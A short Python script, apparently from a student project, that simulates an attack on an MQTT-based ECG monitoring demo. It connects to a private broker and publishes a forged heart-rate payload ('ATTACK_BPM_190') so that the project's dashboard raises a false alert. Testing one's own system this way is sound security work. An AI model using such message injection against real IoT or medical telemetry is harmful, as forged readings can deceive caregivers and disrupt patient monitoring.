import paho.mqtt.client as mqtt
import os
import time

# --- CONFIGURATION DU PIRATE ---
MQTT_BROKER = "10.43.209.150" 
MQTT_TOPIC = "ensi/pcd/ecg"  
def run_attack():
    print(" --- SIMULATION D'ATTAQUE MQTT (PCD ENSI) ---")
    print(f"Connecté au Broker : {MQTT_BROKER}")
    print(f"Topic ciblé : {MQTT_TOPIC}")
    print("-" * 40)

    # 1. Connexion au Broker
    try:
        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        client.connect(MQTT_BROKER, 1883, 60)
    except Exception as e:
        print(f"Erreur: Impossible de se connecter au Broker. Est-il lancé ? ({e})")
        return

  
    
    print("Tentative d'injection de données falsifiées...")
    

    fake_nonce = os.urandom(16)
    

    fake_payload = fake_nonce + b"ATTACK_BPM_190" 


    result = client.publish(MQTT_TOPIC, fake_payload)
    
    if result.rc == mqtt.MQTT_ERR_SUCCESS:
        print("\nSUCCÈS : Message malveillant envoyé sur le topic !")
        print(f"Donnée envoyée (hex) : {fake_payload.hex()}")
        print("\n Regarde ton écran React : il devrait être en ALERTE ROUGE.")
    else:
        print(" ÉCHEC : Impossible de publier le message.")

    client.disconnect()

if __name__ == "__main__":
    run_attack()

    